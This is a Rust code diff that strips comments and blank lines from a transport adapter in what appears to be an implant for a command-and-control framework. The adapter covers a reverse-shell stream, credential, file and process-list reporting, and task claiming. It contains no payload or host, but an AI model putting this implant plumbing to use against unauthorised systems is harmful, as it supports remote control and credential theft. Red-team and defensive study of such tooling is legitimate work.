@@ -6,17 +6,12 @@ use std::sync::Arc;
 use crate::Transport;
 
 pub trait SyncTransport: Send + Sync {
-    // Interactivity
     fn fetch_asset(&self, req: FetchAssetRequest) -> Result<Vec<u8>>;
     fn report_credential(&self, req: ReportCredentialRequest) -> Result<ReportCredentialResponse>;
     fn report_file(&self, req: ReportFileRequest) -> Result<ReportFileResponse>;
     fn report_process_list(&self, req: ReportProcessListRequest) -> Result<ReportProcessListResponse>;
     fn report_task_output(&self, req: ReportTaskOutputRequest) -> Result<ReportTaskOutputResponse>;
-
-    // Reverse shell stream. Note: This assumes the caller will handle the PTY/Shell logic
-    // and just use this for the transport stream.
     fn reverse_shell(&self, rx: Receiver<ReverseShellRequest>, tx: Sender<ReverseShellResponse>) -> Result<()>;
-
     fn claim_tasks(&self, req: ClaimTasksRequest) -> Result<ClaimTasksResponse>;
 }
 
@@ -47,10 +42,8 @@ impl<T: Transport + Clone + Sync + 'static> SyncTransport for SyncTransportAdapt
             let t_guard = self.transport.read().await;
             let mut t = t_guard.clone();
             drop(t_guard);
-
             let (tx, rx) = std::sync::mpsc::channel();
             t.fetch_asset(req, tx).await?;
-
             let mut data = Vec::new();
             while let Ok(resp) = rx.recv() {
                 data.extend(resp.chunk);
@@ -73,7 +66,6 @@ impl<T: Transport + Clone + Sync + 'static> SyncTransport for SyncTransportAdapt
              let t_guard = self.transport.read().await;
             let mut t = t_guard.clone();
             drop(t_guard);
-
             let (tx, rx) = std::sync::mpsc::channel();
             tx.send(req)?;
             drop(tx);
@@ -101,44 +93,29 @@ impl<T: Transport + Clone + Sync + 'static> SyncTransport for SyncTransportAdapt
 
     fn reverse_shell(&self, rx: Receiver<ReverseShellRequest>, tx: Sender<ReverseShellResponse>) -> Result<()> {
         let transport = self.transport.clone();
-
-        // Spawn async task to run the transport reverse_shell
         self.runtime.spawn(async move {
             let t_guard = transport.read().await;
             let mut t = t_guard.clone();
             drop(t_guard);
-
             let (tokio_tx_req, tokio_rx_req) = tokio::sync::mpsc::channel(32);
             let (tokio_tx_resp, mut tokio_rx_resp) = tokio::sync::mpsc::channel(32);
-
-            // Bridge std rx -> tokio tx
             let rx_bridge = tokio::task::spawn_blocking(move || {
                 while let Ok(msg) = rx.recv() {
-                    if tokio_tx_req.blocking_send(msg).is_err() {
-                        break;
-                    }
+                    if tokio_tx_req.blocking_send(msg).is_err() { break; }
                 }
             });
-
-            // Bridge tokio rx -> std tx
             let tx_bridge = tokio::spawn(async move {
                 while let Some(msg) = tokio_rx_resp.recv().await {
-                    if tx.send(msg).is_err() {
-                        break;
-                    }
+                    if tx.send(msg).is_err() { break; }
                 }
             });
-
-            // Run transport
             if let Err(_e) = t.reverse_shell(tokio_rx_req, tokio_tx_resp).await {
                 #[cfg(debug_assertions)]
                 eprintln!("Transport reverse_shell error: {}", _e);
             }
-
             rx_bridge.abort();
             tx_bridge.abort();
         });
-
         Ok(())
     }
 
